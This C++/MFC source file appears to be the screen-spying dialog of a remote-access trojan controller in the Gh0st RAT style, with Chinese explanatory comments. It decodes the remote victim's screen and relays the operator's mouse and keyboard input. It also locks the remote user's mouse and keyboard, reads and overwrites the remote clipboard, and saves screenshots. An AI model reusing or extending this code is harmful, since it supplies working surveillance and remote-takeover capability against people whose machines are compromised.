// ScreenSpyDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Remote.h"
#include "ScreenSpyDlg.h"
#include "afxdialogex.h"
#include "Common.h"
#include "IOCPServer.h"

// CScreenSpyDlg 对话框

enum
{
	IDM_CONTROL = 0x0010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_SAVEDIB,		// 保存图片
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
};

#define  ALGORITHM_DIFF  1

IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)

CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CScreenSpyDlg::IDD, pParent)
{
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_bIsFirst		= true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpScreenDIB	= NULL;
	char szPath[MAX_PATH];
	GetSystemDirectory(szPath, MAX_PATH);
	lstrcat(szPath, "\\shell32.dll");
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szPath, 17/*网上邻居图标索引*/);

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	//重要的是这里，这里将服务端发送来的bmp结构头和服务端屏幕大小保存起来
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];
	
	//这里就是保存bmp位图头了
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

	memset(&m_MMI, 0, sizeof(MINMAXINFO));

	m_bIsCtrl = false; // 默认不控制
	m_nCount = 0;
	m_bCursorIndex = 1;
}

CScreenSpyDlg::~CScreenSpyDlg()
{
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_GETMINMAXINFO()
	ON_WM_HSCROLL()
	ON_WM_VSCROLL()
END_MESSAGE_MAP()


// CScreenSpyDlg 消息处理程序


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪被控端鼠标(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定被控端鼠标和键盘(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&R)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&L)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
	
	}

	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);

	m_HScrollPos = 0;
	m_VScrollPos = 0;
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);

	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;

	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;

	//和被控端一样的位图的图像数据
	//是我们分配好的缓冲区也就是说我们可以更改这个缓冲区里的数据来改变位图图像
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);   //创建应用程序可以直接写入的、与设备无关的位图
	SelectObject(m_hMemDC, m_hFullBitmap);//择一对象到指定的设备上下文环境
	
	
	
	SetScrollRange(SB_HORZ, 0, m_lpbmi->bmiHeader.biWidth);  //指定滚动条范围的最小值和最大值
	SetScrollRange(SB_VERT, 0, m_lpbmi->bmiHeader.biHeight);

	InitMMI();
	SendNext();
	return TRUE; 
}


void CScreenSpyDlg::InitMMI(void)
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);  //窗口的边框矩形的尺寸。该尺寸以相对于屏幕坐标左上角的屏幕坐标给出
	GetClientRect(&rectClient);  //该函数获取窗口客户区的坐标。客户区坐标指定客户区的左上角和右下角。由于客户区坐标是相对窗口客户区的左上角而言的，因此左上角坐标为（0，0）
	ClientToScreen(&rectClient);

	int	nBorderWidth = rectClient.left - rectWindow.left; // 边框宽
	int	nTitleWidth = rectClient.top - rectWindow.top; // 标题栏的高度

	int	nWidthAdd = nBorderWidth * 2 + GetSystemMetrics(SM_CYHSCROLL);   //用于得到被定义的系统数据或者系统配置信息. 水平滚动条的高度和水平滚动条上箭头的宽度
	int	nHeightAdd = nTitleWidth + nBorderWidth + GetSystemMetrics(SM_CYVSCROLL);
	int	nMinWidth = 400 + nWidthAdd;                            //设置窗口最小化时的宽度，高度
	int	nMinHeight = 300 + nHeightAdd; 
	int	nMaxWidth = m_lpbmi->bmiHeader.biWidth + nWidthAdd;     //设置窗口最大化时的宽度，高度
	int	nMaxHeight = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	//设置窗口最小宽度、高度
	m_MMI.ptMinTrackSize.x = nMinWidth;
	m_MMI.ptMinTrackSize.y = nMinHeight;

	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;

	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;

	// 窗口最大化尺寸
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}


void CScreenSpyDlg::SendNext(void)
{
	BYTE	bBuff = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}




void CScreenSpyDlg::OnReceiveComplete(void)
{
	m_nCount++;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN:
		{
			DrawFirstScreen();            //这里显示第一帧图像 一会转到函数定义
			break;
		}
	case TOKEN_NEXTSCREEN:
		{
			if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == ALGORITHM_DIFF)   //我们可以在这里使用不同的算法    
				DrawNextScreenDiff();     //这里是第二帧之后的数据了

			break;
		}
	
	case TOKEN_CLIPBOARD_TEXT:            //获取被控端的剪切板数据
		{
			UpdateLocalClipboard((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
			break;
		}
	        
		
	default:
		// 传输发生异常数据
		return;
	}
}

void CScreenSpyDlg::DrawFirstScreen(void)
{
	m_bIsFirst = false;
	//得到被控端发来的数据 ，将他拷贝到HBITMAP的缓冲区中，这样一个图像就出现了
	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_lpbmi->bmiHeader.biSizeImage);

	PostMessage(WM_PAINT);//触发WM_PAINT消息
}


void CScreenSpyDlg::DrawNextScreenDiff(void)
{
	//该函数不是直接画到屏幕上，而是更新一下变化部分的屏幕数据然后调用
	//OnPaint画上去
	//根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引[][][][][][][][][][][][][][][][
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	POINT	oldPoint;
	memcpy(&oldPoint, &m_RemoteCursorPos, sizeof(POINT));
	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(2), sizeof(POINT));

	// 鼠标移动了
	if (memcmp(&oldPoint, &m_RemoteCursorPos, sizeof(POINT)) != 0)
		bIsReDraw = true;

	// 光标类型发生变化
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10)[0];   //181
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));  //替换指定窗口所属类的WNDCLASSEX结构
	}

	// 屏幕是否变化
	if (dwBytes > 0) 
		bIsReDraw = true;

	//lodsd指令从ESI指向的内存位置向AL/AX/EAX中装 入一个值
	//movsb指令字节传送数据，通过SI和DI这两个寄存器控制字符串的源地址和目标地址
	__asm
	{
		mov ebx, [dwBytes]        //HexxWorld   edi
		                          //HexxWorxx
		mov esi, [lpNextScreen]   //现在[8][2]xx      ecx = 2
		jmp	CopyEnd
CopyNextBlock:
		mov edi, [lpFirstScreen]   //以前
		lodsd	        // 把lpNextScreen的第一个双字节，放到eax中,就是DIB中改变区域的偏移
		add edi, eax	// lpFirstScreen偏移eax	
		lodsd           // 把lpNextScreen的下一个双字节，放到eax中, 就是改变区域的大小
		mov ecx, eax
		sub ebx, 8      // ebx 减去 两个dword
		sub ebx, ecx    // ebx 减去DIB数据的大小    
		rep movsb
CopyEnd:
		cmp ebx, 0 // 是否写入完毕
			jnz CopyNextBlock
	}

	if (bIsReDraw) PostMessage(WM_PAINT);;
}

void CScreenSpyDlg::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GPTR, len);
	if (hglbCopy != NULL) { 
	
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);         
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}


void CScreenSpyDlg::SendLocalClipboard(void)
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}


void CScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this); 

	if (m_bIsFirst)
	{
		DrawTipString("请等待...........");
		return;
	}
	
	//将桌面设备缓冲区复制到我们的内存缓冲区，这个就是抓图。
	//将内存缓冲区复制到设备缓冲区就是显示图了。
	BitBlt
		(
		m_hDC,
		0,
		0,
		m_lpbmi->bmiHeader.biWidth, 
		m_lpbmi->bmiHeader.biHeight,
		m_hMemDC,
		m_HScrollPos,
		m_VScrollPos,
		SRCCOPY
		);

	
	//这里画一下鼠标的图像
	if (m_bIsTraceCursor)
		DrawIconEx(
		m_hDC,								
		m_RemoteCursorPos.x - ((int) m_dwCursor_xHotspot) - m_HScrollPos, 
		m_RemoteCursorPos.y - ((int) m_dwCursor_yHotspot) - m_VScrollPos,
		m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
		0,0,										
		0,										
		NULL,									
		DI_NORMAL | DI_COMPAT					
		);
	
}


void CScreenSpyDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	//COLORREF用来描绘一个RGB颜色
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);	
	COLORREF oldbgcol  = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
	//ExtTextOut函数可以提供一个可供选择的矩形，用当前选择的字体、背景颜色和正文颜色来绘制一个字符串
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText (m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);
}

void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_CONTROL:
		{
			m_bIsCtrl = !m_bIsCtrl;
			pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

			if (m_bIsCtrl)
			{
				if (m_bIsTraceCursor)
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
				else
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
			}
			else
			{
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
			}


			break;
		}
	
	case IDM_TRACE_CURSOR: // 跟踪被控端鼠标
		{	
			m_bIsTraceCursor = !m_bIsTraceCursor;	                               //这里在改变数据
			pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);    //在菜单打钩不打钩
		
			// 重绘消除或显示鼠标
			OnPaint();

			break;
		}

	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
			bToken[1] = !bIsChecked;
			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));

			break;
		}
	case IDM_SAVEDIB:    // 快照保存
		{
			SaveSnapshot();
			break;
		}

	case IDM_GET_CLIPBOARD: // 获取剪贴板
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));

			break;
		}
		
	case IDM_SET_CLIPBOARD: // 设置剪贴板
		{
			SendLocalClipboard();

			break;
		}
	

	default:
		CDialog::OnSysCommand(nID, lParam);
	}

	CDialog::OnSysCommand(nID, lParam);
}




bool CScreenSpyDlg::SaveSnapshot(void)
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "位图文件(*.bmp)|*.bmp|", this);
	if(dlg.DoModal () != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失败");
		return false;
	}

	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);

	
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
	
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();

	return true;

}


BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)   //添加消息过滤函数
{

#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l)
	CRect rect;
	GetClientRect(&rect);

	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);     
			msg.pt.x += m_HScrollPos; 
			msg.pt.y += m_VScrollPos;
			SendCommand(&msg);
		}
		break;
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
			msg.pt.x += m_HScrollPos;
			msg.pt.y += m_VScrollPos;
			SendCommand(&msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	default:
		break;
	}
	return CDialog::PreTranslateMessage(pMsg);
}



void CScreenSpyDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
		return;

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	delete[] lpData;
}

void CScreenSpyDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)  //当窗口大小发生变化时，响应的顺序依次是：WM_GETMINMAXINFO-->WM_SIZING-->WM_SIZE。
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lpMMI, &m_MMI, sizeof(MINMAXINFO));

	CDialog::OnGetMinMaxInfo(lpMMI);
}




void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));

	RECT rect;
	GetClientRect(&rect);

	if ((rect.right + i) > m_lpbmi->bmiHeader.biWidth)
		i = m_lpbmi->bmiHeader.biWidth - rect.right;

	InterlockedExchange((PLONG)&m_HScrollPos, i);

	SetScrollPos(SB_HORZ, m_HScrollPos);

	OnPaint();
	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}


void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &si);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}

	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));


	RECT rect;
	GetClientRect(&rect);

	if ((rect.bottom + i) > m_lpbmi->bmiHeader.biHeight)
		i = m_lpbmi->bmiHeader.biHeight - rect.bottom;

	InterlockedExchange((PLONG)&m_VScrollPos, i);

	SetScrollPos(SB_VERT, i);
	OnPaint();
	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
}
